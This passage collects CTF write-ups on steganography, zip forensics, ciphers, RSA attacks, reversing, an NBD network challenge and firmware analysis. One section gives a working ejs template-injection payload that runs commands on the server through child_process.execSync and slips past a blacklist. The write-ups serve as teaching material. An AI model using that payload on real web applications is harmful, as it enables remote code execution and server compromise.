            pixels[x, y] = (r, g, b, a)

    # Save the modified image
    encoded_image_path = f"new-{image_path}"
    image.save(encoded_image_path)
    print("Message encoded successfully in the image:", encoded_image_path)


# Example usage
image_path = "rules-iceberg.png"

# extract flag from flag.txt
with open("flag.txt", "r") as f:
    flag = f.read().strip()

assert len(flag) == 54

encode_lsb(image_path, flag)
```

#### Solving the challenge

Looking at the script, it does exactly as stated on the screenshot. It hides the flag in the image using LSB but instead of using the last bit of the color it uses the 7th bit. The most important part of thhe script is the following line:

```python
r = (r & 0xFD) | (int(binary_message[char_index]) << 1)
```

So let's analyze it part by part:

```python
r & 0xFD # Sets the 7th bit of the red color to 0

int(binary_message[char_index]) << 1 # Takes a bit of the flag and bitshifts it to the left by a power of 2

(r & 0xFD) | (int(binary_message[char_index]) << 1) # Takes the value gotten from the previous operation and stores it into the 7th bit of the red color
```

With all of that said we can just use the already existing `encode_lsb` function, modify it a bit and make a degenerate function. We just need to use the original image and see what bits have more red than green and blue and then we read the 7th bit of the red channel. If the bit value is zero then the flag bit is also zero, otherwise it is one.


### Solve script (forensics/rulesiceberg)

After writing the decode function we have the following solve script:

```python
from PIL import Image

def encode_lsb(image_path, message):
    # Open the image
    image = Image.open(image_path)
    pixels = image.load()

    # Check if the message can fit within the image
    if len(message) * 8 > image.width * image.height:
        raise ValueError("Message is too long to fit within the image.")

    # Convert the message to binary
    binary_message = ''.join(format(ord(char), '08b') for char in message)

    # Embed the message into the image
    char_index = 0
    for y in range(image.height):
        for x in range(image.width):
            r, g, b, a = pixels[x, y]

            if char_index < len(binary_message):
                # Modify the second least significant bit of the red channel
                # only if red is greater than green and blue
                if r > g and r > b:
                    r = (r & 0xFD) | (int(binary_message[char_index]) << 1)
                    char_index += 1

            pixels[x, y] = (r, g, b, a)

    # Save the modified image
    encoded_image_path = f"new-{image_path}"
    image.save(encoded_image_path)
    print("Message encoded successfully in the image:", encoded_image_path)

def decode_lsb(imagePath, encodedImagePath):

    image = Image.open(imagePath)
    pixels = image.load()

    image1 = Image.open(encodedImagePath)
    pixels1 = image1.load()

    binaryFlag = ""

    char_index = 0

    for y in range(image.height):
        for x in range(image.width):
            r, g, b, a = pixels[x, y]
            r1, g1, b1, a1 = pixels1[x, y]

            if r > g and r > b:

                test = format(r1, '8b')[6]

                if (test == '0'):

                    binaryFlag += '0'

                else:

                    binaryFlag += '1'

    flag = ''.join(chr(int(binaryFlag[i:i+8],2)) for i in range(0,len(binaryFlag),8))

    print(flag)


image_path = "rules-iceberg.png"
encodedImage = "new-rules-iceberg.png"

decode_lsb(image_path, encodedImage)
```
After running the script we get the flag: `amateursCTF{3v3ry0n3_d3f1n1t3ly_l0v3s_st3g0_mhmhmhmhm}`.





### File: writeups/AmateursCTF/Forensics/zipper/zipper.md

## Forensics/zipper

>Author: flocto
>
>101 solves / 431 points

#### The Challenge

We are given a file called `flag.zip` and the following challenge text:

```
Stare into the zip and the zip stares back..
```

#### Solving the challenge

When opening the zip file we are presented with 1000+ files and some folders which we need to traverse to solve the cahllenge. The flag consists of 4 parts and each one is at a different location.

##### Part One

To get the first part of the flag is pretty easy, you just need to open the zip file:

![alt text](./part1.png "Part One of the flag")

Part 1: amateursCTF{z1PP3d_

##### Part Two

This is actually the part that took me the longest to find. When I tryed to unzip the file i got multiple errors and those errors are actually tied to the remaining three parts of the flag. As you can see on the picture above there is a folder just named `..`, well this is actually a mistake in the zip file and it is actually a file that needs to be read in order to get the part two of the flag.

There are two solutions to this problem and the first is opening the file in hexeditor and fixing the file while the second is using the python [zipfile](https://docs.python.org/3/library/zipfile.html) library. I found it much faster to write the script that would give me the second part of the flag:

```python
import zipfile

with zipfile.ZipFile("flag.zip") as f:
    f.printdir()
    for line in f.read("flag/").split(b"\n"):
        print(line)
```
Part 2: in5id3_4_

##### Part Three

This part of the flag was also preety easy to find since it is just a comment on one of the files inside the zip. I found it by accident by using the `zipdetails` tool:

![alt text](./part3.png "Part Three of the flag")

Part 3: laY3r_0f

##### Part Four

The final part of the flag regards most of the errors we got trying to unzip the file because everytime I would try to unpack it I would get errors about overwriting existing files. Luckily the zip terminal tool supports unzipping without overwriting anything.

Then after unzipping the files i just read the file `flag201.txt` to get the fourth part of the flag because it was the file that I was getting errors about and it was the first file in the structure of the zip.

![alt text](./part4.png "Part Four of the flag")

Finally we have the whole flag: `amateursCTF{z1PP3d_in5id3_4_laY3r_0f_Zips}`





### File: writeups/BYUCTF/2023/Crypto/Poem.md

Author: lambdanuu

# Prompt

>epcndkohlxfgvenkzcllkoclivdckskvpkddcyoceipkvrcslkdhycbcscwcsc

>Spaces and punctuation were removed :)

# Solution
<p> I've spent way too much time on this overthinking about _poem code_ but this ended up being much easier than expected. </p>
<p> Using <a href="https://www.dcode.fr/cipher-identifier">this</a> site i was able to identify some of the possible cyphers, including </p>
<ul>
    <li>Phillips Cipher</li>
    <li>Keyboard Change Cipher</li>
    <li>Base62 Encoding</li>
</ul>
<p> The most obvious one to try seemed to be the keyboard change cipher. Decoding the result gives ABC...Z->qwerty and the following string: </p>

>thefragisbyuctfamessagesocrealacharrengetohackelsarinewelevele

<p> Or expanded: </p>

>the frag is byuctf a message so creal a charrenge to hackels a rine we levele

<p> After noticing that 'frag' should be 'flag' and 'creal' makes more sense as 'clear' I tried exchanging r and l and got the following string: </p>

>the flag is byuctf a message so clear a challenge to hackers a line we revere

<p> And we submit the flag </p>

>byuctf{a message so clear a challenge to hackers a line we revere}



### File: writeups/BYUCTF/2023/Pentest/MI6configuration/mi6configuration-writeup.md

# MI6configuration - Writeup (Solve any local VM challenge basically)
Writeup Author - @refr4g

Level - Hard

Description:
```markdown
We recently acquired a computer at MI6 and it seems like they might have made some mistakes. Can you hack it using their misconfigurations and get all their important data? (Download the VM file and power it on. Find the IP address and start hacking!)

*Note - there are 3 flags, flag2 does not exist*

The password to decrypt volume is the first name of the James Bond character "Q" (all lowercase).

https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln
```

# Solution

We know that the password for decrypting the volume is the first name of the James Bond character "Q". After a bit of googling, we found that it was Major Boothroyd, who is known as Q (which stands for Quartermaster). We found the password for decrypting the volume and it is "major".

We will export the virtual machine (appliance), and on that machine we will insert the ubuntu installation iso file so that we can get a live ubuntu.

![Screenshot](1.png)

Now boot into the ubuntu installation, and select try ubuntu. Then open terminal and login as root.

We have to list block devices and see on which partition are system files of challenge.

![Screenshot](2.png)

We can see that /dev/sda5 device is LUKS crypted and thats what we are looking for, on that device are system files of challenge.

Now we will decrypt it using cryptsetup.

![Screenshot](3.png)

We can see that device has been successfully decrypted.

Mount decrypted root partition to /mnt.

![Screenshot](4.png)

Root partition is successfully decrypted. Now we can get all flags for the challenge.

![Screenshot](5.png)

* **Flag 1** - `byuctf{anonymous_ftp}`

![Screenshot](6.png)

* **Flag 3** - `byuCTF{cronjobzz}`

![Screenshot](7.png)

* **Flag 4** - `byuctf{sudo_mi6configured}`



### File: writeups/BYUCTF/2023/Rev/RevEng.md

Author: lambdanuu

# Prompt

>See if you can find the flag!

Attachment: gettingBetter

# Solution
<p> As usual, the first thing to do is see if there's anything interesting using the 'strings' command and the only interesting thing seemed to be the following string </p>

>Xmj%yzwsji%rj%nsyt%f%sj|y

<p>I decided to open the program in ghidra to see what's going on. I found the following code in main: </p>

```c
    local_108 = 0x6e806b79687a7e67;
    local_100 = 0x4c64;
    uStack_fe = 0x796a38647935;
    uStack_f8 = 0x6a59;
    local_f6 = 0x823a3c3e36642657;
    decrypt_passphrase(&local_108,local_178,5);
    print_flag(local_178);]
```
<p> It seems like a string we could use as it's passed to a function decrypt_passphrase as an argument. After taking a look at the function and changing some variable names, we come to see the following code: </p>

```c
    void decrypt_passphrase(long in_str,long out_str,char int_5)

    {
        int i;

        for (i = 0; *(char *)(in_str + i) != '\0'; i = i + 1) {
            *(char *)(out_str + i) = *(char *)(in_str + i) - int_5;
        }
        *(undefined *)(out_str + i) = 0;
        return;
    }
```

<p> What this does is simply subtract 5 from the ascii value of each character. We can easily do this ourselves with some simple python code. Note that chars are read right-to-left. I clearly forgot about the other string so the following is the code I used to get the flag: </p>

```py
a = [0]*5 #the following are just strings that i found in ghidra
a[0] = '6e806b79687a7e67' 
a[1] = '4c64'
a[2] = '796a38647935'
a[3] = '6a59'
a[4] = '823a3c3e36642657'
s = "".join([(bytes.fromhex(substr).decode('latin-1'))[-1::-1] for substr in a])
print("".join([chr(ord(c)-5) for c in s]))
```

<p> The flag is the following </p>

> byuctf{i_G0t_3etTeR!_1975}

<p> A more optimal way to solve the challenge is to use a similar code to put the string we found using 'strings' command </p>

```py
print("".join([chr(ord(c)-5) for c in "Xmj%yzwsji%rj%nsyt%f%sj|y"]))
```

<p> This returns the following string: </p>

>She turned me into a newt

<p> Which when put as an input to the program also gives the flag... A much simpler way to do it. </p>





### File: writeups/NahamConCTF/2023/Crypto/rsaoutro.md

## crypto/rsaoutro

>Author: @Gary#4657
>
>154 solves / 377 points

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-cryptorsaoutro)*

Provided for download are two challenge files: `gen.py` and `output.txt`. When we open `gen.py` we can see the following code:

```python
from Crypto.Util.number import getStrongPrime, isPrime, inverse, bytes_to_long as b2l

FLAG = open('flag.txt', 'r').read()

# safe primes are cool
# https://en.wikipedia.org/wiki/Safe_and_Sophie_Germain_primes
while True:
    q = getStrongPrime(512)
    p = 2*q + 1
    if (isPrime(p)):
        break

n = p*q
phi = (p-1)*(q-1)
e = 0x10001
d = inverse(e, phi)

pt = b2l(FLAG.encode())
ct = pow(pt,e,n)

open('output.txt', 'w').write(f'e: {e}\nd: {d}\nphi: {phi}\nct: {ct}')
```

An interesting implementation of RSA with only the public exponent not being written to the output file. And if we take a look into the output file we get exactly what's expected:

```python
e: 65537
d: 53644719720574049009405552166157712944703190065471668628844223840961631946450717730498953967365343322420070536512779060129496885996597242719829361747640511749156693869638229201455287585480904214599266368010822834345022164868996387818675879350434513617616365498180046935518686332875915988354222223353414730233
phi: 245339427517603729932268783832064063730426585298033269150632512063161372845397117090279828761983426749577401448111514393838579024253942323526130975635388431158721719897730678798030368631518633601688214930936866440646874921076023466048329456035549666361320568433651481926942648024960844810102628182268858421164
ct: 37908069537874314556326131798861989913414869945406191262746923693553489353829208006823679167741985280446948193850665708841487091787325154392435232998215464094465135529738800788684510714606323301203342805866556727186659736657602065547151371338616322720609504154245460113520462221800784939992576122714196812534
```

Since we already have the privete exponent d, the only thing we need is n and we'll be able to get the flag by the looks of it.


#### Derieving n

By looking at the code we notice one important thing:

```python
p = 2*q + 1
```
And since we know that:

```python
phi = (p - 1) * (q - 1)
```
We can use this to derieve p or q just by using some simple math. If we have:

$$phi = (p - 1) * (q - 1)$$

$$p = 2*q + 1$$

We can combine these equations like:

$$phi = ((2*q + 1) - 1) * (q - 1)$$

$$phi = 2*q * (q - 1)$$

$$phi = 2 * q^{2} - 2 * q$$

$$2 * q^{2} - 2 * q - phi = 0$$

This is now a basic quadratic equation that we can solve for q. I used [SageMath](https://www.sagemath.org/) to do that:

```python
eq = 2*x^2 - 2*x - 24533942751... == 0

solve(eq, x)

[x == -1107563604..., x == 1107563604...]
```

Now we can just take the positive value for `x` and use it to calculate the values for p and n and then get the flag.

### Solve script (crypto/rsaoutro)

Here we can just take all the values given in the `output.txt` file and the value for q we calculated and code them into the script. Finally we can just use standard RSA to decrypt the flag:

```python
#!/bin/python
from Crypto.Util.number import long_to_bytes

e = 65537
d = 53644719720574049009405552166157712944703190065471668628844223840961631946450717730498953967365343322420070536512779060129496885996597242719829361747640511749156693869638229201455287585480904214599266368010822834345022164868996387818675879350434513617616365498180046935518686332875915988354222223353414730233
phi = 245339427517603729932268783832064063730426585298033269150632512063161372845397117090279828761983426749577401448111514393838579024253942323526130975635388431158721719897730678798030368631518633601688214930936866440646874921076023466048329456035549666361320568433651481926942648024960844810102628182268858421164
ct = 37908069537874314556326131798861989913414869945406191262746923693553489353829208006823679167741985280446948193850665708841487091787325154392435232998215464094465135529738800788684510714606323301203342805866556727186659736657602065547151371338616322720609504154245460113520462221800784939992576122714196812534

q = 11075636043081312130072482386894153179906741704107014422233346592319924162396870630618684638610997030440993794793932027132363928350671662212985373363848339

p = 2 * q + 1

n = p * q

p = pow(ct, d, n)

print(long_to_bytes(p).decode())

```
After running the script we get the decrypted output: `flag{8b76b85e7f450c39502e71c215f6f1fe}`.



### File: writeups/NahamConCTF/2023/Networks/nobigdeal.md

## networks/nobigdeal

>Author: @JohnHammond#6971
>
>500 points

#### The Challenge

At the first glance we are presented with a simple challenge text:
```
lol no dw, it's nbd, u can find the flag.
```

Besides the text we are just presented with a host ip address and port.


#### Looking into the challenge

When using [Netcat](https://netcat.sourceforge.net/) to connect to the host we get the following response:

![alt text](./response.png "Response from server when connecting with Netcat")

After looking into the network traffic in [Wireshark](https://netcat.sourceforge.net/) I noticed that the magic bytes never change and then I went on to do some research. That is when I found that there is a protocol called [NBD](https://github.com/NetworkBlockDevice/nbd/blob/master/doc/proto.md) which stands for `Network Block Device` and is used for sharing storage mediums over networks. So I figured that this is the protocol the server is using.

#### Solving the challenge

Luckly there is a tool that can be used to connect to NBD servers called `nbd-client` but when I tryed to connect to the challenge server I got the following message: `warning the oldstyle protocol is no longer supported`. After doing a bit more research on the NBD github I figured out that NBD protocol has a new version of handshake which has been implemented in version 3.10 of the package.

In order to connect to the server I needed an older version which I found at the [NBD Surceforge](https://sourceforge.net/projects/nbd/files/nbd/). After downloading and installing an older version of the package I was finally able to connect to the server using following command:
```
sudo nbd-client challenge.nahamcon.com 30434 /dev/nbd0
```

It executed without errors this time, but when I tried to mount the shared volume I got another error:
```
/mnt is not a block device.
```
This was unexpected so I decided to do a hex dump of the NBD volume in order to inspect it and I got the following result:
```
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 006f 0000 006f 0103 0000 00d8 0b0c  ...o...o........
00000020: 2300 0000 0650 4c54 4500 0000 ffff ffa5  #....PLTE.......
00000030: d99f dd00 0000 0274 524e 53ff ffc8 b5df  .......tRNS.....
00000040: c700 0000 0970 4859 7300 000b 1200 000b  .....pHYs.......
00000050: 1201 d2dd 7efc 0000 0126 4944 4154 388d  ....~....&IDAT8.
00000060: d5d4 bd91 c320 1005 e077 a380 4c6e 8019  ..... ...w..Ln..
00000070: da20 a325 a901 6337 20b7 4446 1b9a a101  . .%..c7 .DF....
00000080: c808 18ef 2df6 fd06 a725 7170 8c92 2f41  ....-....%qp../A
00000090: 6f97 05d0 af85 ffc1 0c9c 5d3b 9106 8cc8  o.........];....
000000a0: 426d b17a 0dcd d300 833e 639f 9d5e d410  Bm.z.....>c..^..
000000b0: 17bb bf85 51fa a8a1 c648 6d8d cdd7 ef90  ....Q....Hm.....
000000c0: 07e4 7ad7 a8f9 fb2a ff80 8f65 2eea 6763  ..z....*...e..gc
000000d0: ff64 0647 9aae 356d 56e6 1d69 7369 53e6  .d.G..5mV..isiS.
000000e0: 6e8d c812 7758 5302 f57f 49cc 3665 d0a6  n...wXS...I.6e..
000000f0: 7807 9954 dbd9 d2ad b605 32b3 4ad7 385d  x..T......2.J.8]
00000100: 5ca2 6044 52dc 17b7 fb60 9ea9 8e59 28dd  \.`DR....`...Y(.
00000110: e2c4 a94a 1d60 8427 bd92 9e9d 1199 3165  ...J.`.'......1e
00000120: 4757 e2ce cb2c 150b 373c b4f5 71a0 02c9  GW...,..7<..q...
00000130: dc42 9b7b 2a23 b3ee 270e 5f01 4722 7965  .B.{*#..'._.G"ye
00000140: 87b9 9fa9 11c9 13cb 9dec 43fb 79d9 0fc8  ..........C.y...
00000150: 77c1 7327 9d29 7180 a1b7 d107 408d 31d2  w.s'.)q.....@.1.
00000160: 050d 768c 1c3e 4ef7 11f6 37a7 01ed 1464  ..v..>N...7....d
00000170: f67a 2d6d 76fa 98f6 43be eec9 7d15 df01  .z-mv...C...}...
00000180: a583 3672 0978 cf5d 0000 0000 4945 4e44  ..6r.x.]....IEND
00000190: ae42 6082 0000 0000 0000 0000 0000 0000  .B`.............

```
Obviously this is a PNG image, and at this point there are two solutions to this challenge.

##### In terminal solution

After seeing that the file in question is a PNG image I opened it and saw that it was a QR code. To get the solution we can just use zbarimg:

```
zbarimg /dev/nbd0

QR-Code:flag{181638ce1336f4b274c2646b92b60e4e}
```

##### Cyberchef solution

After getting the hexdump of the file we can use [Cyberchef](https://gchq.github.io/CyberChef/) to get the flag from the image. This is the solution I found first since I wasn't sure if the PNG in question was a QR code or something else. I used the following recipe:

![alt text](./solution.png "Getting the flag by using Cyberchef")




### File: writeups/SEETF/2023/Express-JavaScript-Security/writeup/writeup.md



`Author: eliyah`

`Challenge: Express Javascript Security`

# Overview

We are given a url to the site and the site code which you can find in the challenge directory.

The website has 2 endpoints. Root (`/`) endpoint and the `/greet` endpoint. On the first one is a form that just sends you to the `/greet` endpoint with some query parameters set (font, fontSize, name). With the given parameters second endpoint just returns page with hello message styled with selected font and size.

`http://ejs.web.seetf.sg:1337/`:

![Screenshot](ss1.png)

=> `http://ejs.web.seetf.sg:1337/greet?name=someName&font=Arial&fontSize=20`:

![Screenshot](ss2.png)

Also, in the docker container there is `/readflag` executable that outputs the flag to stdout. 

# Code examination and solution

Because of this section of code in the main.js the function that is used for rendering ejs templates is [renderFile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441).
```js
// main.js

// ejs v3.1.9
app.set('view engine', 'ejs');
```


Array of filters that mustn't be found in the request query:

```js
// main.js

const BLACKLIST = [
    "outputFunctionName",
    "escapeFunction",
    "localsName",
    "destructuredLocals"
]
```

The vulnerable function:

```js
// main.js

app.get('/greet', (req, res) => {
    
	const data = JSON.stringify(req.query);
    	if (BLACKLIST.find((item) => data.includes(item))) {
        	return res.status(400).send('Can you not?');
   	}
	
    // Vulnerability is here
	// because the req.query object is passed 
	// directly to the render function.
    // This is not good practice because 
    // an adversary can make use of the 
    // rendering options.
    return res.render('greet', { 
    	...JSON.parse(data),
    	cache: false
    });
});
```
- *Rendering options can also be passed through the data argument of the renderFile function through the settings object. [RENDERING OPTIONS](https://github.com/mde/ejs/blob/main/docs/jsdoc/options.jsdoc)*

Parts of [renderFile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441):
```js
// github repo: mde/ejs
// lib/ejs.js

exports.renderFile = function(){
	//... 
	if (data.settings) {
		//...
		viewOpts = data.settings['view options'];
        	if (viewOpts) {
          		utils.shallowCopy(opts, viewOpts);
        	}
	}
	//...
	
}
```
- *When there is only one argument(data) specified in the render call the function copies rendering options from the `data`'s `settings[view options]` field. With this in mind I could pass url like `http://ejs.web.seetf.sg:1337?settings[view options][escape]=...` and it will set the option `escape` to the passed value.*

Because of the BLACKLIST filters some template render options cannot be used. Fortunately in the BLACKLIST there is only `escapeFunction` option and not it's alias `escape`. What I can do with this?

I took another look at the ejs source and i found something interesting.

- *When rendering template, ejs is dynamically creating function that will assemble the template with the data passed to it. The function is compiled from the string which is dynamically created based on the template. All of this is happening in the [compile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441) function of the `Template` class that eventually gets called.*

Parts of [Template.compile](https://github.com/mde/ejs/blob/main/lib/ejs.js#L441):
```js
// github repo: mde/ejs
// lib/ejs.js

Template.prototype={
    //...
    compile = function() {
	//...
	var escapeFn = opts.escapeFunction;
	//...
	if (opts.client) {
		// src is the string containing the source code of the function that assembles the template
     		src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
    	}
}
```

Looking at this piece of code it looks like that I can pass my own function to the escapeFn if the opts.client is true. 

- *The `escapeFn` is called for the every variable name found between delimiters `<%=` and `%>`. In short, every appearance of the `<%= var_name %>` is replaced with the result value of `escapeFn(var_name)`.
You can find it in [this function](https://github.com/mde/ejs/blob/main/lib/ejs.js#L815).*

So I tried with the payload:

```
http://ejs.web.seetf.sg:1337/greet?settings[view%20options][escape]=function(){return%20process.mainModule.require(%27child_process%27).execSync(%27/readflag%27)}&font=aaa&fontSize=aaa&settings[view%20options][client]=true&name=aaa
```

And it was successful :D

![Screenshot](ss3.png)







### File: writeups/TJCTF/2023/Crypto/e.md

## crypto/e

>Author: stosp
>
>64 solves / 60 points
>
>smol e

*Note: Below you'll find a guided solution. If interested just in the solve script, click [here](#solve-script-cryptoe)*

When we first open up our challenge, we are greeted with two files: `gen.sage` and `output.txt`. It's the former that interests us a lot more, so let's take a look:
```python
from Crypto.Util.number import bytes_to_long

p = random_prime(2 ^ 650)
q = random_prime(2 ^ 650)
N = p*q
e = 5
flag = open("flag.txt", "rb").read().strip()
m = bytes_to_long(b'the challenges flag is ' + flag)
c = m ^ e % N
print("N: ", N)
print("C: ", c)
print("e: ", e)
```
Obviously, we're dealing with RSA here. The primes seem safely generated and the encryption's standard - we can find our public key and the ciphertext in `output.txt`. So our eyes turn to the central section:
```python
e = 5
flag = open("flag.txt", "rb").read().strip()
m = bytes_to_long(b'the challenges flag is ' + flag)
```

Immediately we notice that $e = 5$. This should tell us that whatever attack we plan on mounting likely relies on a small exponent.

Next, we notice that our message (i.e. plaintext) is a combination of a known string and the (unknown) flag. More precisely, it means we have a partially known plaintext. 


#### Enter Coppersmith
Let's take a short detour.

In the mid-to-late 90s, a very clever man named Don Coppersmith, building on the ideas of other clever people, came up with a method for solving univariate modular equations. That is, equations with one variable modulo some $N$. He'd present a very efficient method for finding small roots (i.e. solutions) of such polynomials. In time, this would be generalized for multivariate polynomials as well. The details of the *how* are beyond the scope of this write-up (but can be found [here](https://cr.yp.to/bib/2001/coppersmith.pdf)).

Though that begs the question: what's *small*? For a polynomial of degree $k$, we call small roots of the polynomial those less than $N^{1/k}$. 

Now, what does this have to do with us? Well, let's look at our message:
```python
b'the challenges flag is ' + flag
```
Obviously, we know the higher bits of the plaintext ($kBits$) but don't know the flag ($x$). If we assume that the flag is $h$ bits large, we can rewrite our message as:

$$kBits * 2^{h} + x = m$$

Which tells us that the ciphertext is:

$$c \equiv m^e \equiv (kBits * 2^{h} + x)^e \ \ \ \ (mod\ N)$$

And since we know that $e=5$ we can write it as:

$$(kBits * 2^{h} + x)^5 - c \equiv 0  \ \ \ \ (mod\ N)$$

And what we get, after expanding it, is a:
- univariate polynomial (it has only one unknown, $x$),
- that is modulo $N$,
- with a small degree $k = e = 5$,
- and a relatively small root.

So we can apply Coppersmith! Luckily for us, [SageMath](https://www.sagemath.org/) already has Coppersmith's method implemented for us in the form of the `small_roots` function.

### Solve script (crypto/e)
To make our lives easier, we recall that the flag format for the CTF is `tjctf{` so we append that to our known string. Additionally, as standard calls to `small_roots()` don't result in any outputs, we increase the epsilon value (which defaults to 1/8). We can roughly understand it as increasing the bounds of the algorithm. The lower the epsilon, the larger the bounds.
```python
from sage.all import *

N = 8530080367614029604 ...
C = 2987003325076547237 ... 
e = 5
Z = Zmod(N)
P.<x> = PolynomialRing(Z)

msg = b'the challenges flag is tjctf{'
known = Z(int(msg.hex(), 16)) # Bytes to decimal

for unknown_bytes in range(2,33): # x < N^(1/5) ~= 32 bytes
    m = known * 2^(8*unknown_bytes)
    f = (m + x)^e - C
    
    roots = f.small_roots(epsilon=1/12)
    if roots != []:
        print(roots)
        break

```
When converting the number to bytes, we get `coppersword2}`, resulting in the full message being `the challenges flag is tjctf{coppersword2}`.


### File: writeups/TJCTF/2023/Crypto/keysmith.md

## crypto/keysmith

>Author: stosp
>
>30 solves / 128 points
>
>I lost my key... can you find it?
>
>`nc tjc.tf 31103`

*Note: Below you'll find a guided solution. If interested in just the solve script, click [here](#solve-script-cryptokeysmith)*

Downloading the challenge, we stumble upon `server.py` - let's see what we've got:
```python
#!/usr/local/bin/python3.10 -u
from Crypto.Util.number import getPrime
flag = open("flag.txt", "r").read()

po = getPrime(512)
qo = getPrime(512)
no = po * qo
eo = 65537

msg = 762408622718930247757588326597223097891551978575999925580833
s = pow(msg,eo,no)

print(msg,"\n",s)

try:
    p = int(input("P:"))
    q = int(input("Q:"))
    e = int(input("E:"))
except:
    print("Sorry! That's incorrect!")
    exit(0)

n = p * q
d = pow(e, -1, (p-1)*(q-1))
enc = pow(msg, e, n)
dec = pow(s, d, n)
if enc == s and dec == msg:
    print(flag)
else:
    print("Not my keys :(")
```

Interesting. So we're given $m$ and $s$ (and technically $e_o$), and nothing else. Let's put this into some equations:

$$n_o = p_o * q_o$$
$$s \equiv m^{e_o} \quad (mod\ n_o)$$

So our $s$ is essentially an encrypted message. And for our chosen input of $e$, $p$ and $q$ we have:

$$n = p * q$$

$$d \equiv e^{-1} \quad (mod\ n)$$

$$enc \equiv m^e \quad (mod\ n),\ \text{where $enc$ should be the same as $s$}$$

$$dec \equiv s^d \quad (mod\ n),\ \text{where $dec$ should be the same as $m$}$$

Right, that's a few expressions. Let's put some words behind them.

Effectively, we're looking to input parameters $n$ and $e$ such that $m^e$ equals to a specific number $s$. If our numbers $p$ and $q$ are both prime, then the second test regarding $dec$ will always pass.

Obviously, one way to get the flag would be to send the private parameters back. However, seeing as the target $n_o$ is rather large, factoring it isn't really an option.
So what now? Well, let's think back to what we just said: we're looking to find an $e$ such that $m^e$ equals to $s$. This problem, when stated over a numbers modulo $n$, is called the **discrete logarithm problem** (or DLP for short).

The DLP is the 'hard' problem behind cryptosystems such as Diffie-Hellman. It's proven to be rather difficult in the general case, however there are some special cases when it's far easier. Notably, for a prime $p$, if $p-1$ is smooth (meaning it has many prime factors), it's possible to solve the DLP in polynomial time. But is us being forced to send two primes, resulting in a composite DLP, going to be an issue? Of course not! Thanks to the Chinese Remainder Theorem, we can solve the DLP modulo each prime factor using the efficient algorithm.

The algorithm in question, called [Pohlig–Hellman](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm), is luckily implemented in SageMath through the `discrete_logarithm` function. All that's left now is to code-up the rest.

#### Generating $p-1$ smooth numbers
While for solving our special case of the DLP we have an efficient algorithm, how would we go about generating these 'smooth' numbers? The method we'll employ is surprisingly simple: multiply a lot of small numbers, check if the incremented version of the number is prime and, if so, return that number. Here's one way to achieve just that in SageMath:
```python
from sage.all import *

def smooth_prime(r=80): 
    not_found = True 
    while not_found: 
        k = 2 
        for _ in range(r): 
            k *= random_prime(1000, 10000) * random_prime(10000, 1000000) 
        k += 1 
        if is_prime(k) and len(factor(k-1)) > 20: 
            not_found = False 
            return k 
```
Here our function's parameter `r` corresponds to a rough estimate of how many prime multiplications we'd like. While not ideal, it gets the job done - a better method would be to go about multiplying random numbers until a certain bit-length is reached. But we don't have to worry about a key-size here, as long as our public key $n$ is larger than $s$,  we're set.

### Solve script (crypto/keysmith)

To simplify things, we only bother with ensuring $p-1$ is smooth. For $q$ we can send any small prime factor. It should be noted that we might need multiple attempts with this script; sometimes, we'll get such an $s$ that finding a modular inverse is unlikely (or impossible).
```python
from sage.all import *

def smooth_prime(r=80): 
    not_found = True 
    while not_found: 
        k = 2 
        for _ in range(r): 
            k *= random_prime(1000, 10000) * random_prime(10000, 1000000) 
        k += 1 
        if is_prime(k) and len(factor(k-1)) > 20: 
            not_found = False 
            return k 
                         
# === SETUP
from pwn import *
server = "tjc.tf"
port = 31103
io = remote(server, port)

# === INIT
msg = int(io.recvline())
s = int(io.recvline())

eo = 65537

# === PAYLOAD
successful = False
while not successful:
    p = int(smooth_prime(55))
    q = 3
    n = p*q
    print("Attempting...")
    Z = Zmod(n)
    try:
        e = discrete_log(Z(s), Z(msg))
        e = int(e)
        e = e % ((p-1)*(q-1))
        d = pow(e, -1, (p-1)*(q-1))
    except ValueError:
        continue
    except ZeroDivisionError:
        continue
    
    successful = True

# === CHECKS
enc = pow(msg, e, n)
dec = pow(s, d, n)
assert enc == s
assert dec == msg

# === ATTACK
p_ = str(p).encode()
print(p_)
io.sendline(p_)

q_ = str(q).encode()
print(q_)
io.sendline(q_)

e_ = str(e).encode()
print(e_)
io.sendline(e_)

io.interactive() # tjctf{lock-smith_289378972359}
```


### File: writeups/TyphonCTF/2023/Hardware/dumbiotpart1/dumbiotpart1.md

## hardware/dumbiotpart1

#### The Challenge

For the challenge we are just given a link (`typhoonconctf-2023-dumb-internet-of-things.chals.io`) and dump file of the device.

#### First look

Analyzing the `Device.dump` file with the file command we get the following output:

```
Device.dump: Squashfs filesystem, little endian, version 4.0, zlib compressed, 2037751 bytes, 540 inodes, blocksize: 131072 bytes, created: Mon Jun  5 13:12:33 2023
```

Since it is a file system we can mount it and traverse through it. After mounting it we get a standard Linux directory structure with [BusyBox](https://busybox.net/) which indicates that this is some kind of IoT device.

After doing a bit of recon I found an executable called `runProcess` located in the `/usr/bin/` directory which isn't standard. Trying to run the binary yields the following error because of the architecture difference:

```
exec format error: ./runProcess
```

So insted I used [Ghidra](https://ghidra-sre.org/) to analyze the file.


#### Solving the challenge

Once I opened the file in Ghidra I instantly noticed some interesting Base64 strings in the main function:

```
local_d60 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXJuYW1lIiwicGFzc3";
local_d58 = "mFzZiBmbmFzbmtqYmdramFzIGp2rYWtqZyBhapnYUxvcmVtIGlwc3VtIGRvbHIgc2lyIHFmYXNmIGZuYXNua2piZ2tqYXMgamtha2";
local_d50 = "pnIGFramdhTG9yZW0gaXBzdW0gZG9 sciBzaXIgcWZhc2YgZm5hc25ramJna2phha2pnIGrYWtqZyBhapnYUxvcmVtIGlwc3V tIGRv";
local_d48 = "dvcmQiOiJwYXNzd29yZCJ9.Z3L0g6iMMOKVsIPsES_KpHID1l_JQ5tqnKxfM4NMJQkAA";
```

Decoding the first string gave me the following result:

```
{"alg":"HS256","typ":"JWT"}{"username":"username","pass
```

